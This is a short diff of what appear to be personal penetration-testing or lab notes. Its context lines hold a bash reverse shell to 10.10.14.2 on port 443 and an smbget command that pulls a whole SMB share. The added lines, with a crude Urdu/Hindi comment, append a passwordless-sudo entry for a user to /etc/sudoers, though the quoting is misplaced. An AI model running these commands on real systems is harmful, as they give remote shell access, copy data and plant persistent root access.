@@ -457,3 +457,6 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'
 
 Download all files in Commander share:
 smbget -R smb://<ip>:12445/Commander
+
+Ab shell nhe lain gei, yei karein gei (MKC):
+echo "dademola     ALL=(ALL) NOPASSWD:ALL >> /etc/sudoers" #here dademola is the username
